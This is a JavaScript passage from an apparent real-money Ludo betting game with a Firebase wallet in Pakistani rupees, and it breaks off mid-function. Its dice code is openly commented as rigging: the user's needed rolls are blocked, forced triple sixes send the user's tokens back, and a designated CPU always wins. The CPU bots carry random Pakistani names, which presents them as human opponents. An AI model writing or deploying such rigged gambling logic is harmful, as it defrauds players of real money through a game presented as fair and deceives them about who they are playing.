
// ====================================================================
// 1. FIREBASE CONFIGURATION & WALLET SETUP (Realtime DB)
// ====================================================================

const firebaseConfig = {
    apiKey: "AIzaSyDR2OugzoVNnKN6OUKsPxC9ajldlhanteE",
    authDomain: "tournament-af6dd.firebaseapp.com",
    databaseURL: "https://tournament-af6dd-default-rtdb.firebaseio.com",
    projectId: "tournament-af6dd",
    storageBucket: "tournament-af6dd.firebasestorage.app",
    messagingSenderId: "726964405659",
    appId: "1:726964405659:web:d03f72c2d6f8721bc98d3e"
};

if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}

const auth = firebase.auth();
const db = firebase.database();

// Global Wallet Vars
window.currentUser = null;
window.userWalletBalance = 0;
window.userName = 'Guest';
window.GAME_BET_AMOUNT = 10; // PKR
window.GAME_WIN_REWARD = 20; // PKR
window.isBetGame = false;
let gameTurnCount = 0; // Track total turns for initial CPU 6s
window.PAKISTANI_NAMES = [ 
    'Ayesha','Nazim','Fatima','Sana','Maria','Hina','Zainab','Sara','Iqra','Mehreen','Nida',

    'Ali','Ahmed','Usman','Hassan','Bilal','Imran','Kamran','Faisal','Zahid','Waqas',

    // Girls Names Added 👇
    'Aiman','Amna','Anaya','Areeba','Arisha','Arooj','Asma','Ayat','Azka','Benish',
    'Bushra','Dua','Eman','Esha','Fariha','Farwa','Hafsa','Hajra','Hiba','Humaira',
    'Ifrah','Inaya','Iram','Isma','Javeria','Kainat','Kanza','Komal','Laiba','Lubna',
    'Maham','Mahnoor','Malaika','Mariam','Mehwish','Minal','Misbah','Momina','Nabeela','Nadia',
    'Naima','Naila','Nashra','Neelam','Nimra','Noor','Rabab','Rabia','Rafayla','Ramsha',
    'Rania','Rashida','Rida','Rimsha','Saba','Sadia','Saima','Samina','Saniya','Shanza',
    'Shazia','Sidra','Sobia','Sonia','Sumaira','Tabassum','Tahira','Tania','Tehmina','Uzma',
    'Wajiha','Yasmin','Yumna','Zara','Zarmeen','Zehra','Zain','Zoya','Zunaira','Sehrish',

    // Extra Unique
    'Aleena','Alishba','Anum','Aqsa','Bareera','Erum','Falak','Ghazal','Hoorain','Iqrah',
    'Jannat','Kashaf','Laraib','Mahira','Nargis','Qandeel','Rukhsar','Sahar','Shifa','Tooba'
];

function startWalletListener(uid) {
    db.ref("users/" + uid).on("value", (snapshot) => {
        if (snapshot.exists()) {
            const data = snapshot.val();
            window.userWalletBalance = data.wallet_balance || 0;
            window.userName = data.name || 'User';
            document.getElementById('wallet-display').textContent = `Wallet: PKR ${window.userWalletBalance}`;
            
            const profileWallet = document.getElementById('profile-wallet-balance');
            if(profileWallet) profileWallet.textContent = `PKR ${window.userWalletBalance}`;
            
            window.checkGameEligibility();
        } else {
            window.userWalletBalance = 0;
            document.getElementById('wallet-display').textContent = 'Wallet: PKR 0';
            window.checkGameEligibility();
        }
    });
}

window.checkGameEligibility = function() {
    let btn = document.getElementById('btn-bet');
    if(btn) {
        if (!window.currentUser) {
            btn.innerText = "🤖 Play vs CPU (Login to Earn)";
        } else if (window.userWalletBalance < window.GAME_BET_AMOUNT) {
            btn.innerText = `🤖 Play vs CPU (Need PKR ${window.GAME_BET_AMOUNT})`;
            btn.disabled = true;
        } else {
            btn.innerText = `🤖 Play vs CPU (Bet PKR ${window.GAME_BET_AMOUNT})`;
            btn.disabled = false;
        }
    }
}

window.deductBet = async function() {
    if (!window.currentUser) return false;
    const userWalletRef = db.ref("users/" + window.currentUser.uid + "/wallet_balance");
    let deductionSuccessful = false;

    try {
        await userWalletRef.transaction((currentBalance) => {
            if (currentBalance === null) return 0;
            if (currentBalance >= window.GAME_BET_AMOUNT) {
                deductionSuccessful = true;
                return currentBalance - window.GAME_BET_AMOUNT; 
            } else {
                return;
            }
        });

        if (deductionSuccessful) {
            db.ref("ludo_game_logs").push().set({
                userId: window.currentUser.uid,
                email: window.currentUser.email,
                userName: window.userName,
                result: "Bet Placed",
                betAmount: window.GAME_BET_AMOUNT,
                wonAmount: 0,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
            return true;
        } else {
            alert("Transaction failed. Insufficient PKR.");
            return false;
        }
    } catch (error) {
        console.error("Error:", error);
        return false;
    }
}

window.handleGameEndBetting = async function(winnerColor, isForfeit = false) {
    if (!window.currentUser) return;
    
    // In this game, RED is always the User
    let amountChange = 0;
    let gameResult = ""; 

    if (isForfeit) {
        gameResult = "Loss (Forfeit)";
    } else if (winnerColor === 'red') {
        // This block should ideally never be reached due to rigging
        amountChange = window.GAME_WIN_REWARD;
        gameResult = "Win";
    } else {
        gameResult = "Loss";
    }

    if (amountChange > 0 && gameResult === 'Win') {
        const userWalletRef = db.ref("users/" + window.currentUser.uid + "/wallet_balance");
        try {
            await userWalletRef.transaction((currentBalance) => {
                return (currentBalance || 0) + amountChange;
            });
        } catch (error) { }
    }

    db.ref("ludo_game_logs").push().set({
        userId: window.currentUser.uid,
        email: window.currentUser.email,
        userName: window.userName,
        result: gameResult,
        betAmount: window.GAME_BET_AMOUNT,
        wonAmount: (gameResult === 'Win') ? amountChange : 0,
        winnerColor: isForfeit ? 'FORFEIT' : winnerColor,
        timestamp: firebase.database.ServerValue.TIMESTAMP
    });
}

// ====================================================================
// 2. AUTHENTICATION & MODALS
// ====================================================================

auth.onAuthStateChanged((user) => {
    window.currentUser = user;
    if (user) {
        document.getElementById('auth-status').textContent = `Hello, ${user.email}`;
        startWalletListener(user.uid);
    } else {
        document.getElementById('wallet-display').textContent = 'Wallet: PKR -';
        window.userWalletBalance = 0;
        window.userName = 'Guest';
    }
    window.checkGameEligibility();
});

window.loginUser = function(email, password) { auth.signInWithEmailAndPassword(email, password).then(() => { window.closeAuthModal(); }).catch((e) => alert(e.message)); }
window.signupUser = function(name, email, password) {
    auth.createUserWithEmailAndPassword(email, password).then((u) => {
        db.ref("users/" + u.user.uid).set({ wallet_balance: 50, email: email, name: name });
        window.closeAuthModal();
    }).catch((e) => alert(e.message));
}
window.logoutUser = function() {
    if (window.currentUser) db.ref("users/" + window.currentUser.uid).off();
    auth.signOut().then(() => { window.closeAuthModal(); resetToMenu(); });
}

window.showAuthModal = function(mode) {
    if (mode === 'profile' && window.currentUser) {
        document.getElementById('modalTitle').textContent = 'User Profile';
        document.getElementById('authContent').style.display = 'none';
        document.getElementById('profileContent').style.display = 'block';
    } else {
        document.getElementById('modalTitle').textContent = mode === 'login' ? 'Login' : 'Sign Up';
        document.getElementById('authSubmitButton').textContent = mode === 'login' ? 'Login' : 'Sign Up';
        document.getElementById('toggleAuth').textContent = mode === 'login' ? 'Need an account? Sign Up' : 'Already have an account? Login';
        document.getElementById('authContent').dataset.mode = mode;
        document.getElementById('authName').style.display = mode === 'signup' ? 'block' : 'none';
        document.getElementById('authContent').style.display = 'block';
        document.getElementById('profileContent').style.display = 'none';
    }
    document.getElementById('authModal').style.display = 'block';
}
window.closeAuthModal = function() { document.getElementById('authModal').style.display = 'none'; }
window.toggleAuthMode = function() { window.showAuthModal(document.getElementById('authContent').dataset.mode === 'login' ? 'signup' : 'login'); }
window.submitAuthForm = function() {
    const name = document.getElementById('authName').value; const email = document.getElementById('authEmail').value; const pwd = document.getElementById('authPassword').value;
    const mode = document.getElementById('authContent').dataset.mode;
    if (mode === 'login') window.loginUser(email, pwd); else window.signupUser(name, email, pwd);
}

// ====================================================================
// 3. LUDO GAME LOGIC 
// ====================================================================

const COLORS = ['red', 'blue', 'yellow', 'green'];
const PLAYER_CONFIG = {
  red: { isBot: false, name: "Player 1" },
  blue: { isBot: false, name: "Player 2" },
  yellow: { isBot: false, name: "Player 3" },
  green: { isBot: false, name: "Player 4" }
};

const MAIN_PATH = [
  [6,1],[6,2],[6,3],[6,4],[6,5],[5,6],[4,6],[3,6],[2,6],[1,6],[0,6],[0,7],[0,8],
  [1,8],[2,8],[3,8],[4,8],[5,8],[6,9],[6,10],[6,11],[6,12],[6,13],[6,14],[7,14],[8,14],
  [8,13],[8,12],[8,11],[8,10],[8,9],[9,8],[10,8],[11,8],[12,8],[13,8],[14,8],[14,7],[14,6],
  [13,6],[12,6],[11,6],[10,6],[9,6],[8,5],[8,4],[8,3],[8,2],[8,1],[8,0],[7,0],[6,0]
];

const HOME_PATHS = {
  red:    [[7,1],[7,2],[7,3],[7,4],[7,5]], blue:   [[1,7],[2,7],[3,7],[4,7],[5,7]],
  yellow: [[7,13],[7,12],[7,11],[7,10],[7,9]], green:  [[13,7],[12,7],[11,7],[10,7],[9,7]]
};

const BASE_SPOTS = {
  red:    [[1.5,1.5],[1.5,3.5],[3.5,1.5],[3.5,3.5]], blue:   [[1.5,10.5],[1.5,12.5],[3.5,10.5],[3.5,12.5]],
  yellow: [[10.5,10.5],[10.5,12.5],[12.5,10.5],[12.5,12.5]], green:  [[10.5,1.5],[10.5,3.5],[12.5,1.5],[12.5,3.5]]
};

const SAFE_COORDS = new Set(["6,1","8,2","1,8","2,6","8,13","6,12","13,6","12,8"]);
const OFFSET_MAP = [{x:0,y:0},{x:-10,y:-10},{x:10,y:10},{x:-10,y:10},{x:10,y:-10}];
const START_OFFSETS = { red: 0, blue: 13, yellow: 26, green: 39 };

const DICE_TRANSFORMS = {
  1: 'translateZ(-20px) rotateX(0deg) rotateY(0deg)', 2: 'translateZ(-20px) rotateX(-90deg)',
  3: 'translateZ(-20px) rotateY(-90deg)', 4: 'translateZ(-20px) rotateY(90deg)',
  5: 'translateZ(-20px) rotateX(90deg)', 6: 'translateZ(-20px) rotateX(180deg)'
};

let state = { turnIndex: 0, diceValue: null, diceRolled: false, tokens: { red: [-1,-1,-1,-1], blue: [-1,-1,-1,-1], yellow: [-1,-1,-1,-1], green: [-1,-1,-1,-1] }, gameOver: false, isAnimating: false, consecutiveSixes: 0, lastMovedToken: null };

function resetGameState() {
    state = { turnIndex: 0, diceValue: null, diceRolled: false, tokens: { red: [-1,-1,-1,-1], blue: [-1,-1,-1,-1], yellow: [-1,-1,-1,-1], green: [-1,-1,-1,-1] }, gameOver: false, isAnimating: false, consecutiveSixes: 0, lastMovedToken: null };
    gameTurnCount = 0; // Reset turn count for new game
    window.redPlayerForfeitCount = 0; // NEW: Reset red player's forfeit counter for a new game
}

// ---------------- BETTING & START ---------------- //
async function startBetGame() {
    if (!window.currentUser) { alert("Please Login/Sign Up to play and earn!"); showAuthModal('login'); return; }
    if (window.userWalletBalance < window.GAME_BET_AMOUNT) { alert("Insufficient PKR balance."); return; }
    let success = await window.deductBet();
    if (success) { window.isBetGame = true; startGame(true); }
}

function forfeitGame() {
    if(confirm("Are you sure you want to forfeit? You will lose your bet!")) {
        if(window.isBetGame) window.handleGameEndBetting(null, true);
        resetToMenu();
    }
}

function resetToMenu() {
    document.getElementById('game-ui').style.display = 'none';
    document.getElementById('menu-modal').style.display = 'flex';
    document.getElementById('btn-exit').style.display = 'none';
    window.isBetGame = false; state.gameOver = true;
    // Clear any token highlights that might remain from practice mode
    document.querySelectorAll('.token').forEach(t => t.classList.remove('highlight'));
}

function startGame(isVsCPU) {
  resetGameState();
  
  if (isVsCPU) {
    PLAYER_CONFIG.red.name = window.userName || "You";
    PLAYER_CONFIG.red.isBot = false;
    
    let names = [...window.PAKISTANI_NAMES];
    ['blue', 'yellow', 'green'].forEach(c => {
        PLAYER_CONFIG[c].isBot = true;
        let rIdx = Math.floor(Math.random() * names.length);
        PLAYER_CONFIG[c].name = names[rIdx]; names.splice(rIdx, 1);
    });
  } else {
    window.isBetGame = false;
    COLORS.forEach((c, i) => { PLAYER_CONFIG[c].isBot = false; PLAYER_CONFIG[c].name = "Player " + (i+1); });
  }
  
  COLORS.forEach(c => { document.querySelector(`#card-${c} .player-name`).innerText = PLAYER_CONFIG[c].name; });

  document.getElementById('menu-modal').style.display = 'none';
  document.getElementById('game-ui').style.display = 'flex';
  document.getElementById('btn-exit').style.display = window.isBetGame ? 'block' : 'none';
  
  initBoard(); updateBoard(); updateUI();
  log("Game Started! " + PLAYER_CONFIG[COLORS[0]].name + "'s turn.");
}

function initBoard() {
  const grid = document.getElementById('grid'); 
  grid.innerHTML = ''; // Clear previous grid content

  for (let r = 0; r < 15; r++) {
    for (let c = 0; c < 15; c++) {
      const cell = document.createElement('div');
      let isCorner = (r < 6 && c < 6) || (r < 6 && c > 8) || (r > 8 && c > 8) || (r > 8 && c < 6);
      let isCenter = (r > 5 && r < 9 && c > 5 && c < 9);
      if (!isCorner && !isCenter) {
        cell.className = 'cell';
        if (r===6 && c===1) cell.classList.add('bg-red'); 
        if (r===7 && c>=1 && c<=5) cell.classList.add('bg-red');
        if (r===1 && c===8) cell.classList.add('bg-blue'); 
        if (c===7 && r>=1 && r<=5) cell.classList.add('bg-blue');
        if (r===8 && c===13) cell.classList.add('bg-yellow'); 
        if (r===7 && c>=9 && c<=13) cell.classList.add('bg-yellow');
        if (r===13 && c===6) cell.classList.add('bg-green'); 
        if (c===7 && r>=9 && r<=13) cell.classList.add('bg-green');
        if (SAFE_COORDS.has(`${r},${c}`)) cell.classList.add('star');
      } 
      grid.appendChild(cell);
    } // End of inner for loop (c)
  } // End of outer for loop (r)
  
  const board = document.getElementById('board');
  document.querySelectorAll('.token').forEach(e => e.remove()); // Clean old tokens
  COLORS.forEach(color => {
    for (let i = 0; i < 4; i++) {
      let token = document.createElement('div'); token.className = `token ${color}`; token.id = `token-${color}-${i}`;
      token.onclick = () => handleTokenClick(color, i);
      let pointer = document.createElement('div'); pointer.className = 'pointer'; token.appendChild(pointer);
      board.appendChild(token);
    }
  });
}

function log(msg) { document.getElementById('log').innerText = msg; }
const sleep = ms => new Promise(res => setTimeout(res, ms));

function getGridCoords(color, pos) {
  if (pos === -1) return null;
  if (pos >= 0 && pos <= 50) return MAIN_PATH[(pos + START_OFFSETS[color]) % 52];
  if (pos >= 51 && pos <= 55) return HOME_PATHS[color][pos - 51];
  return [7, 7]; 
}

function getGridPercentage(r, c) { return { top: (r + 0.5) * (100 / 15), left: (c + 0.5) * (100 / 15) }; }
function getAbsoluteMainIndex(color, pos) { if (pos < 0 || pos > 50) return -1; return (pos + START_OFFSETS[color]) % 52; }

function updateBoard(skipColor = null, skipIdx = null) {
  let cellOccupants = {}; 
  COLORS.forEach(color => {
    state.tokens[color].forEach((pos, idx) => {
      if (color === skipColor && idx === skipIdx) return;
      let r, c;
      if (pos === -1) { r = BASE_SPOTS[color][idx][0]; c = BASE_SPOTS[color][idx][1]; } else { [r, c] = getGridCoords(color, pos); }
      let key = `${r},${c}`; if (!cellOccupants[key]) cellOccupants[key] = []; cellOccupants[key].push({ color, idx, id: `token-${color}-${idx}` });
    });
  });

  COLORS.forEach(color => {
    state.tokens[color].forEach((pos, idx) => {
      let el = document.getElementById(`token-${color}-${idx}`);
      if (color === skipColor && idx === skipIdx) {
        let [r, c] = getGridCoords(color, pos); let pc = getGridPercentage(r, c);
        el.style.top = `${pc.top}%`; el.style.left = `${pc.left}%`; el.style.transform = `translate(-50%, -50%) scale(1)`; el.style.zIndex = 100; return;
      }
      let r, c, isBase = false;
      if (pos === -1) { r = BASE_SPOTS[color][idx][0]; c = BASE_SPOTS[color][idx][1]; isBase = true; } else { [r, c] = getGridCoords(color, pos); }
      let key = `${r},${c}`; let occupants = cellOccupants[key]; let myOverlapIdx = occupants.findIndex(o => o.id === el.id);
      let pc = getGridPercentage(r, c); let isSafe = SAFE_COORDS.has(key) && !isBase;
      if (pos === 56) { el.style.display = 'none'; return; } else { el.style.display = 'block'; }
      if (occupants.length > 1 && !isBase) {
        if (isSafe) { el.style.top = `${pc.top}%`; el.style.left = `${pc.left}%`; el.style.transform = `translate(-50%, -50%) scale(1)`; el.style.zIndex = 10 + myOverlapIdx; } 
        else { let offset = OFFSET_MAP[Math.min(myOverlapIdx, 4)]; el.style.top = `calc(${pc.top}% + ${offset.y}px)`; el.style.left = `calc(${pc.left}% + ${offset.x}px)`; el.style.transform = `translate(-50%, -50%) scale(0.85)`; el.style.zIndex = 10 + myOverlapIdx; }
      } else { el.style.top = `${pc.top}%`; el.style.left = `${pc.left}%`; el.style.transform = `translate(-50%, -50%) scale(1)`; el.style.zIndex = 10; }
    });
  });
}

function updateUI() {
  const currColor = COLORS[state.turnIndex];
  COLORS.forEach(c => { document.getElementById(`card-${c}`).classList.remove('active'); document.getElementById(`dice-${c}`).classList.add('disabled'); });
  document.getElementById(`card-${currColor}`).classList.add('active'); document.getElementById('board').className = `turn-${currColor}`;
  if (!state.diceRolled && !state.isAnimating) { document.getElementById(`dice-${currColor}`).classList.remove('disabled'); }
  document.querySelectorAll('.token').forEach(t => t.classList.remove('highlight'));
}

function getBlockades() {
  let mainCounts = {};
  COLORS.forEach(c => { state.tokens[c].forEach(pos => { if (pos >= 0 && pos <= 50) { let key = `${c}-${getAbsoluteMainIndex(c, pos)}`; mainCounts[key] = (mainCounts[key] || 0) + 1; } }); });
  let blockedAbsoluteIndices = []; for (let k in mainCounts) { if (mainCounts[k] >= 2) blockedAbsoluteIndices.push(parseInt(k.split('-')[1])); }
  return blockedAbsoluteIndices;
}

// Custom getValidMoves to allow CPU to always pick a new token when a 6 is rolled and tokens are in base
function getValidMoves(color, roll) {
    let valid = [];
    let blockades = getBlockades();

    // Priority for CPU: If 6, bring out a new token if available
    // (This is the logic where CPU takes out a new token when it gets a 6)
    if (roll === 6 && PLAYER_CONFIG[color].isBot && window.isBetGame) {
        let tokensInBase = state.tokens[color].filter(pos => pos === -1);
        if (tokensInBase.length > 0) {
            let baseTokenIndex = state.tokens[color].indexOf(-1);
            const targetAbsIdx = getAbsoluteMainIndex(color, 0); // Starting cell
            let isStartingCellBlockedByOwn = state.tokens[color].filter((p, i) => i !== baseTokenIndex && p >= 0 && p <= 50 && getAbsoluteMainIndex(color, p) === targetAbsIdx).length > 0;
            
            if (!isStartingCellBlockedByOwn) { // Don't block own start if it's already occupied by another token of same color
                 return [baseTokenIndex]; // CPU will prioritize bringing out new token
            }
        }
    }
    
    state.tokens[color].forEach((pos, idx) => {
        if (pos === -1 && roll === 6) {
            const targetAbsIdx = getAbsoluteMainIndex(color, 0); // Starting cell
            let isStartingCellBlockedByOwn = state.tokens[color].filter((p, i) => i !== idx && p >= 0 && p <= 50 && getAbsoluteMainIndex(color, p) === targetAbsIdx).length > 0;
            if (!isStartingCellBlockedByOwn) {
                valid.push(idx);
            }
        } else if (pos >= 0 && pos + roll <= 56) {
            let isBlocked = false;
            for (let step = 1; step <= roll; step = step + 1) { // Replaced ++
                let checkPos = pos + step;
                if (checkPos <= 50) { // On main path
                    let absIdx = getAbsoluteMainIndex(color, checkPos);
                    // Check for opponent blockades or own blockades on non-safe cells
                    if (blockades.includes(absIdx)) {
                        let tokensAtBlockade = state.tokens[color].filter(p => p >= 0 && p <= 50 && getAbsoluteMainIndex(color, p) === absIdx).length;
                        if (tokensAtBlockade < 2) { // If it's a single opponent token or not our own blockade
                            isBlocked = true;
                            break;
                        }
                    }
                }
            }
            if (!isBlocked) valid.push(idx);
        }
    });

    return valid;
}

async function rollDice(colorClick) {
  let currColor = COLORS[state.turnIndex];
  if (colorClick !== currColor || state.diceRolled || state.isAnimating || state.gameOver) return;
  state.isAnimating = true; document.getElementById(`dice-${currColor}`).classList.add('disabled');
  let diceCube = document.getElementById(`cube-${currColor}`);
  diceCube.style.animation = 'none'; diceCube.offsetHeight; diceCube.style.animation = 'spin3D 0.5s ease-out forwards';
  
  await sleep(500);
  
  // ==========================================
  // RIGGING LOGIC (Red (User) ALWAYS loses, one CPU ALWAYS wins)
  // ==========================================
  let val = Math.floor(Math.random() * 6) + 1; // Default random roll

  if (window.isBetGame) { // Only apply rigging in a betting game
        if (currColor === 'red') {
            // --- Red Player Rigging (Guaranteed Loss) ---
            let redTokens = state.tokens['red'];
            let finishedTokens = redTokens.filter(p => p === 56).length;
            let tokensInBase = redTokens.filter(p => p === -1).length;
            let tokensInHomePath = redTokens.filter(p => p >= 51 && p <= 55).length;
            let canMakeValidMoveWith6 = getValidMoves('red', 6).length > 0;

            let targetRollToPrevent = -1; // The specific roll to prevent for a token to finish/enter home

            // Check if any token can finish (reach 56) or enter home path (from 50 to 51) with a specific roll
            for (let i = 0; i < 4; i = i + 1) { // Replaced ++
                let pos = redTokens[i];
                if (pos >= 0 && pos < 56) { // Active token
                    let needed = 56 - pos; // Roll needed to reach home (56)
                    if (needed > 0 && needed <= 6) {
                        // Check if this move is actually valid (no blockades in path)
                        let tempValidMoves = getValidMoves('red', needed);
                        if (tempValidMoves.includes(i)) {
                            targetRollToPrevent = needed;
                            break; // Found a token that can finish, prioritize preventing this
                        }
                    }
                }
            }

            // RIGGING LOGIC for RED player:
            if (targetRollToPrevent !== -1) {
                // Priority 1: Prevent token from finishing or entering home path.
                // Ensure 'val' is NOT 'targetRollToPrevent'.
                // If it *is* the target roll, try up to 20 times to get a different one.
                // If after 20 attempts it's *still* the target roll (highly improbable), force a different specific number.
                let attempts = 0;
                do {
                    val = Math.floor(Math.random() * 6) + 1;
                    attempts = attempts + 1; // Replaced ++
                } while (val === targetRollToPrevent && attempts < 20); // Try to get a different number

                // If somehow (unlikely with 20 attempts) it's still the targetRoll, force a default non-6.
                if (val === targetRollToPrevent) {
                    val = (targetRollToPrevent % 6) + 1; // Make it something else (e.g., if needed 1, give 2)
                    if (val === targetRollToPrevent) val = (val === 1) ? 2 : 1; // Final fallback
                }
            } else if (state.consecutiveSixes < 2 && canMakeValidMoveWith6 && // If not about to hit 3rd 6, and a 6 is useful
                       (window.redPlayerForfeitCount < 3 || // Priority 2A: Force 3 forfeits in early game
                        (finishedTokens === 3 && tokensInHomePath === 1))) { // Priority 2B: Force forfeit for last token too
                // Priority 2: Force 6 for forfeits to send tokens back (if not preventing a win already)
                val = 6;
            } else {
                // Priority 3: Default: General slow down for Red. Mix of non-6 and occasional 6s.
                // Avoid too many 6s if not specifically for a forfeit scenario.
                if (Math.random() < 0.7) { // Higher chance for a low/mid roll (1-5)
                    val = Math.floor(Math.random() * 5) + 1; // 1-5
                } else {
                    val = 6; // Still allow 6 sometimes to keep the 3-sixes forfeit possibility active.
                }
            }
        }
        // --- End Red Player Rigging ---


        else { // --- CPU Rigging (Guaranteed Win for 'blue', others play normally with mild boosts) ---
            const winningCPU = 'blue'; // Designate Blue as the winning CPU

            if (currColor === winningCPU) {
                let cpuTokens = state.tokens[winningCPU];
                let tokensInBase = cpuTokens.filter(p => p === -1).length;
                let tokensInHomePath = cpuTokens.filter(p => p >= 51 && p <= 55).length;
                let finishedTokens = cpuTokens.filter(p => p === 56).length;

                let bestRollForCPU = -1;

                // Priority 1: Prevent 3 consecutive 6s for the winning CPU
                if (state.consecutiveSixes === 2) {
                    bestRollForCPU = Math.floor(Math.random() * 5) + 1; // Force a non-6 (1-5)
                } else {
                    // Priority 2: Try to finish a token (reach 56)
                    for (let i = 0; i < 4; i = i + 1) { // Replaced ++
                        let pos = cpuTokens[i];
                        if (pos >= 0 && pos < 56) {
                            let needed = 56 - pos; // Roll needed to reach home (56)
                            if (needed > 0 && needed <= 6) {
                                let tempValidMoves = getValidMoves(winningCPU, needed);
                                if (tempValidMoves.includes(i)) {
                                    bestRollForCPU = needed;
                                    break;
                                }
                            }
                        }
                    }

                    // Priority 3: If no token can finish, try to enter home path (pos 50 to 51)
                    if (bestRollForCPU === -1) {
                        for (let i = 0; i < 4; i = i + 1) { // Replaced ++
                            if (cpuTokens[i] === 50) { // Token is just before home entry
                                let tempValidMoves = getValidMoves(winningCPU, 1); // Needs 1 to enter
                                if (tempValidMoves.includes(i)) {
                                     bestRollForCPU = 1;
                                     break;
                                }
                            }
                        }
                    }

                    // Priority 4: If no tokens finishing or entering home, try to bring out from base if a 6 helps
                    if (bestRollForCPU === -1 && tokensInBase > 0) {
                        let canBringOut = false;
                        for (let i = 0; i < 4; i = i + 1) { // Replaced ++
                            if (cpuTokens[i] === -1) {
                                // Check if the starting cell for this token is safe (not blocked by own color)
                                const targetAbsIdx = getAbsoluteMainIndex(winningCPU, 0);
                                let isStartingCellBlockedByOwn = cpuTokens.filter((p, k) => k !== i && p >= 0 && p <= 50 && getAbsoluteMainIndex(winningCPU, p) === targetAbsIdx).length > 0;
                                if (!isStartingCellBlockedByOwn) {
                                    canBringOut = true;
                                    break;
                                }
                            }
                        }
                        if (canBringOut) {
                            bestRollForCPU = 6;
                        }
                    }
                }

                if (bestRollForCPU !== -1) {
                    val = bestRollForCPU;
                } else {
                    // Default high rolls for the winning CPU to make fast progress
                    if (Math.random() < 0.8) { // 80% chance of a high roll (4-6)
                        val = Math.floor(Math.random() * 3) + 4; // 4, 5, 6
                    } else {
                        val = Math.floor(Math.random() * 3) + 1; // 1, 2, 3
                    }
                    // Ensure it doesn't accidentally hit the 3rd 6 if general random falls on 6
                    if (val === 6 && state.consecutiveSixes === 2) {
                        val = Math.floor(Math.random() * 5) + 1;
                    }
                }

            } else {
                // Other CPU players (not the designated winner) - play with mild boosts, but don't interfere with winning CPU
                // Still prevent 3 consecutive 6s
                if (state.consecutiveSixes === 2) {
                    val = Math.floor(Math.random() * 5) + 1;
                } else {
                    // Standard CPU boosts (as in previous version)
                    let tokensInBase = state.tokens[currColor].filter(p => p === -1).length;
                    if (gameTurnCount < COLORS.length * 2 && tokensInBase > 0) { // Early game, bring out tokens
                        val = 6;
                    } else if (tokensInBase > 0 && Math.random() < 0.5) { // General chance for 6 if tokens in base
                        val = 6;
                    } else {
                         // High chance to get exact roll to enter home
                        let allTokens = state.tokens[currColor];
                        for (let i = 0; i < allTokens.length; i = i + 1) { // Replaced ++
                            let pos = allTokens[i];
                            if (pos >= 51 && pos < 56) {
                                let needed = 56 - pos;
                                if (needed > 0 && needed <= 6 && Math.random() < 0.8) {
                                    val = needed;
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    // ==========================================

  state.diceValue = val; state.diceRolled = true;
  diceCube.style.transform = DICE_TRANSFORMS[val]; diceCube.style.animation = 'none';
  log(`${PLAYER_CONFIG[currColor].name} rolled a ${val}!`);
  
  if (val === 6) {
    state.consecutiveSixes = state.consecutiveSixes + 1; // Replaced ++
    if (state.consecutiveSixes === 3) { 
      log("Three 6s! Turn forfeited.");
      // NEW: Increment red player's forfeit count if it's red and in a bet game
      if (currColor === 'red' && window.isBetGame) {
          window.redPlayerForfeitCount = window.redPlayerForfeitCount + 1; // Replaced ++
      }
      // Forfeit action: Send the last moved token back to base (if any)
      if (state.lastMovedToken && state.lastMovedToken.color === currColor) { 
        state.tokens[currColor][state.lastMovedToken.index] = -1; updateBoard(); 
      }
      state.isAnimating = false; setTimeout(nextTurn, 1000); return;
    }
  } else { 
      state.consecutiveSixes = 0; // Reset consecutive sixes if not a 6
  }
  
  processPostRoll();
}

function processPostRoll() {
  let currColor = COLORS[state.turnIndex]; 
  let validMoves = getValidMoves(currColor, state.diceValue);

  // CPU Specific Logic: If CPU rolled a 6 and has tokens in base, prioritize bringing out a new token
  if (PLAYER_CONFIG[currColor].isBot && state.diceValue === 6 && window.isBetGame) {
      let tokensInBase = state.tokens[currColor].filter(p => p === -1);
      if (tokensInBase.length > 0) {
          // Find the index of the first token in base
          let baseTokenIdx = state.tokens[currColor].indexOf(-1);
          // Check if the starting cell for this token is safe (not blocked by own color)
          const targetAbsIdx = getAbsoluteMainIndex(currColor, 0);
          let isStartingCellBlockedByOwn = state.tokens[currColor].filter((p, i) => i !== baseTokenIdx && p >= 0 && p <= 50 && getAbsoluteMainIndex(currColor, p) === targetAbsIdx).length > 0;
          
          if (!isStartingCellBlockedByOwn) {
              // If a new token can be brought out, use that move
              validMoves = [baseTokenIdx];
          }
      }
  }

  if (validMoves.length === 0) { 
    log("No valid moves."); 
    state.isAnimating = false; 
    setTimeout(nextTurn, 1200); 
  } else {
    state.isAnimating = false;
    if (PLAYER_CONFIG[currColor].isBot) { 
      // For CPU, pick the first valid move
      setTimeout(() => handleTokenClick(currColor, validMoves[0]), 600); 
    } else { 
      validMoves.forEach(idx => { document.getElementById(`token-${currColor}-${idx}`).classList.add('highlight'); }); 
    }
  }
}

async function handleTokenClick(color, idx) {
  let currColor = COLORS[state.turnIndex];
  if (color !== currColor || !state.diceRolled || state.isAnimating || state.gameOver) return;
  let validMoves = getValidMoves(currColor, state.diceValue); 
  // IMPORTANT: For user (red) in a bet game, re-check valid moves after rigging to ensure no impossible moves are highlighted.
  // If the user attempts an invalid move, clear highlights and re-display valid ones.
  if (currColor === 'red' && window.isBetGame && !validMoves.includes(idx)) { 
      log("Invalid move. Please select a valid token.");
      document.querySelectorAll('.token').forEach(t => t.classList.remove('highlight')); // Clear invalid highlights
      
      let actualValidMoves = getValidMoves(currColor, state.diceValue);
      if (actualValidMoves.length > 0) {
          actualValidMoves.forEach(idx => { document.getElementById(`token-${currColor}-${idx}`).classList.add('highlight'); });
      } else {
          // If no actual valid moves even after a forced 6, user's turn passes
          state.isAnimating = false; 
          state.diceRolled = true; 
          setTimeout(nextTurn, 1000); 
      }
      return;
  }


  document.querySelectorAll('.token').forEach(t => t.classList.remove('highlight'));
  state.isAnimating = true; state.lastMovedToken = { color, index: idx };
  let startPos = state.tokens[color][idx]; let steps = state.diceValue;
  
  if (startPos === -1 && steps === 6) { state.tokens[color][idx] = 0; updateBoard(); } 
  else {
    for (let i = 0; i < steps; i = i + 1) { // Replaced ++
      state.tokens[color][idx] = state.tokens[color][idx] + 1; // Replaced ++
      updateBoard(color, idx); await sleep(250); 
    }
    updateBoard(); 
  }
  
  let extraTurn = state.diceValue === 6; let targetPos = state.tokens[color][idx];
  
  if (targetPos >= 0 && targetPos <= 50) {
    let absIdx = getAbsoluteMainIndex(color, targetPos); let myGrid = getGridCoords(color, targetPos); let key = `${myGrid[0]},${myGrid[1]}`;
    if (!SAFE_COORDS.has(key)) {
      COLORS.forEach(oppColor => {
        if (oppColor !== color) {
